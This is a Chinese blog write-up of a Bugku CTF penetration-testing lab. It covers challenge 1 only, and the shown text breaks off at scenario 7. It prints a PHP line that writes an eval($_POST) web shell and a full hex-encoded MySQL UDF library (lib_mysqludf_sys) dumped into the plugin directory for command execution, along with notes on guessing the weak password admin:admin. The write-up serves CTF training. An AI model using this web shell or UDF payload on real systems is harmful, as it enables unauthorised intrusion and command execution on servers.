<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Bugku渗透测试1-4 | P4tt0n's b10g</title><meta name="author" content="P4tt0n"><meta name="copyright" content="P4tt0n"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="渗透测试1开题http://101.133.129.4:80  场景1查看网页源代码发现flag，并发现下一个flag的提示  场景2扫描发现/admin  进行弱口令爆破发现账号密码为admin：admin，登录成功  找到第二个flag以及下一个提示  场景3添加可以上传php文件  发现可以在线执行代码  进行写文件 <?php fputs(fopen('shell">
<meta property="og:type" content="article">
<meta property="og:title" content="Bugku渗透测试1-4">
<meta property="og:url" content="https://p4tt0n.github.io/2025/02/21/Bugku%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951-4/index.html">
<meta property="og:site_name" content="P4tt0n's b10g">
<meta property="og:description" content="渗透测试1开题http://101.133.129.4:80  场景1查看网页源代码发现flag，并发现下一个flag的提示  场景2扫描发现/admin  进行弱口令爆破发现账号密码为admin：admin，登录成功  找到第二个flag以及下一个提示  场景3添加可以上传php文件  发现可以在线执行代码  进行写文件 <?php fputs(fopen('shell">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg">
<meta property="article:published_time" content="2025-02-21T04:42:58.000Z">
<meta property="article:modified_time" content="2025-02-21T04:52:22.416Z">
<meta property="article:author" content="P4tt0n">
<meta property="article:tag" content="渗透测试">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg"><link rel="shortcut icon" href="https://pic.imge.cc/2024/08/01/66ab32dd0cc03.png"><link rel="canonical" href="https://p4tt0n.github.io/2025/02/21/Bugku%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951-4/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css?v=4.14.0-b3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>(()=>{
      const saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
      
      window.btf = {
        saveToLocal: saveToLocal,
        getScript: (url, attr = {}) => new Promise((resolve, reject) => {
          const script = document.createElement('script')
          script.src = url
          script.async = true
          script.onerror = reject
          script.onload = script.onreadystatechange = function() {
            const loadState = this.readyState
            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
            script.onload = script.onreadystatechange = null
            resolve()
          }

          Object.keys(attr).forEach(key => {
            script.setAttribute(key, attr[key])
          })

          document.head.appendChild(script)
        }),

        getCSS: (url, id = false) => new Promise((resolve, reject) => {
          const link = document.createElement('link')
          link.rel = 'stylesheet'
          link.href = url
          if (id) link.id = id
          link.onerror = reject
          link.onload = link.onreadystatechange = function() {
            const loadState = this.readyState
            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
            link.onload = link.onreadystatechange = null
            resolve()
          }
          document.head.appendChild(link)
        }),

        addGlobalFn: (key, fn, name = false, parent = window) => {
          const pjaxEnable = false
          if (!pjaxEnable && key.startsWith('pjax')) return

          const globalFn = parent.globalFn || {}
          const keyObj = globalFn[key] || {}
    
          if (name && keyObj[name]) return
    
          name = name || Object.keys(keyObj).length
          keyObj[name] = fn
          globalFn[key] = keyObj
          parent.globalFn = globalFn
        }
      }
    
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode
      
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })()</script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":true,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Bugku渗透测试1-4',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-02-21 12:52:22'
}</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="./themes/butterfly/source/css/custom.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="./themes/butterfly/source/css/modify.css"><link rel="stylesheet" href="./themes/butterfly/source/css/transpancy.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (false) {
    btf.addGlobalFn('pjaxSend', () => { preloader.initLoading() }, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', () => { preloader.endLoading() }, 'preloader_end')
  }
})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr class="custom-hr"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://pic2.zhimg.com/32098d0cc61d44d6151fb7614211d256_r.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="P4tt0n's b10g"><img class="site-icon" src="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" alt="Logo"><span class="site-name">P4tt0n's b10g</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Bugku渗透测试1-4</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-02-21T04:42:58.000Z" title="发表于 2025-02-21 12:42:58">2025-02-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-02-21T04:52:22.416Z" title="更新于 2025-02-21 12:52:22">2025-02-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>16分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Bugku渗透测试1-4"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url('https://pic2.zhimg.com/32098d0cc61d44d6151fb7614211d256_r.jpg');"></div><article class="post-content" id="article-container"><h2 id="渗透测试1"><a href="#渗透测试1" class="headerlink" title="渗透测试1"></a>渗透测试1</h2><p>开题<a target="_blank" rel="noopener" href="http://101.133.129.4/">http://101.133.129.4:80</a></p>
<p><img src="/2024/07/30/hello-world/image-20250218125948526.png" alt="image-20250218125948526"></p>
<h3 id="场景1"><a href="#场景1" class="headerlink" title="场景1"></a>场景1</h3><p>查看网页源代码发现flag，并发现下一个flag的提示</p>
<p><img src="/2024/07/30/hello-world/image-20250218130041254.png" alt="image-20250218130041254"></p>
<h3 id="场景2"><a href="#场景2" class="headerlink" title="场景2"></a>场景2</h3><p>扫描发现/admin</p>
<p><img src="/2024/07/30/hello-world/image-20250218130709303.png" alt="image-20250218130709303"></p>
<p>进行弱口令爆破发现账号密码为admin：admin，登录成功</p>
<p><img src="/2024/07/30/hello-world/image-20250218130817705.png" alt="image-20250218130817705"></p>
<p>找到第二个flag以及下一个提示</p>
<p><img src="/2024/07/30/hello-world/image-20250218131042818.png" alt="image-20250218131042818"></p>
<h3 id="场景3"><a href="#场景3" class="headerlink" title="场景3"></a>场景3</h3><p>添加可以上传php文件</p>
<p><img src="/2024/07/30/hello-world/image-20250218131407513.png" alt="image-20250218131407513"></p>
<p>发现可以在线执行代码</p>
<p><img src="/2024/07/30/hello-world/image-20250218131830032.png" alt="image-20250218131830032"></p>
<p>进行写文件</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php eval($_POST[1]);phpinfo();?&gt;'</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>



<p><img src="/2024/07/30/hello-world/image-20250218132056989.png" alt="image-20250218132056989"></p>
<p>蚁剑连接，找到flag</p>
<p><img src="/2024/07/30/hello-world/image-20250218132049072.png" alt="image-20250218132049072"></p>
<h3 id="场景4"><a href="#场景4" class="headerlink" title="场景4"></a>场景4</h3><p>找到数据库配置文件app/database.php</p>
<p><img src="/2024/07/30/hello-world/image-20250218132311433.png" alt="image-20250218132311433"></p>
<p>连接数据库 localhost改为127.0.0.1</p>
<p><img src="/2024/07/30/hello-world/image-20250218132929237.png" alt="image-20250218132929237"></p>
<p>找到flag</p>
<p><img src="/2024/07/30/hello-world/image-20250218133105622.png" alt="image-20250218133105622"></p>
<h3 id="场景5"><a href="#场景5" class="headerlink" title="场景5"></a>场景5</h3><p>题目处有提示但是不会pwn，这里用的udf提权</p>
<p><img src="/2024/07/30/hello-world/image-20250218133234014.png" alt="image-20250218133234014"></p>
<p>查看一下版本吧</p>
<p><img src="/2024/07/30/hello-world/image-20250218133629241.png" alt="image-20250218133629241"></p>
<p><img src="/2024/07/30/hello-world/image-20250218134028810.png" alt="image-20250218134028810"></p>
<p>插件位置</p>
<p><img src="/2024/07/30/hello-world/image-20250218134053342.png" alt="image-20250218134053342"></p>
<p>发现可以mysql udf提权<a target="_blank" rel="noopener" href="https://www.sqlsec.com/tools/udf.html">MySQL UDF 提权十六进制查询 | 国光</a></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">SELECT 0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000 INTO DUMPFILE '/usr/lib/x86_64-linux-gnu/mariadb18/plugin/udf.so';</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/2024/07/30/hello-world/image-20250218134419402.png" alt="image-20250218134419402"></p>
<p>然后引用文件镜像</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/2024/07/30/hello-world/image-20250218134526706.png" alt="image-20250218134526706"></p>
<p>成功提权</p>
<p><img src="/2024/07/30/hello-world/image-20250218134604005.png" alt="image-20250218134604005"></p>
<p>拿到第五段flag和提示的8080端口</p>
<p><img src="/2024/07/30/hello-world/image-20250218135214532.png" alt="image-20250218135214532"></p>
<h3 id="场景6"><a href="#场景6" class="headerlink" title="场景6"></a>场景6</h3><p>访问8080端口还是一个登录框</p>
<p><img src="/2024/07/30/hello-world/image-20250218135425078.png" alt="image-20250218135425078"></p>
<p><img src="/2024/07/30/hello-world/image-20250218135510277.png" alt="image-20250218135510277"></p>
<p>发现robots.txt拿到flag</p>
<p><img src="/2024/07/30/hello-world/image-20250218140517824.png" alt="image-20250218140517824"></p>
<h3 id="场景7"><a href="#场景7" class="headerlink" title="场景7"></a>场景7</h3><p>尝试用弱口令登陆抓包</p>
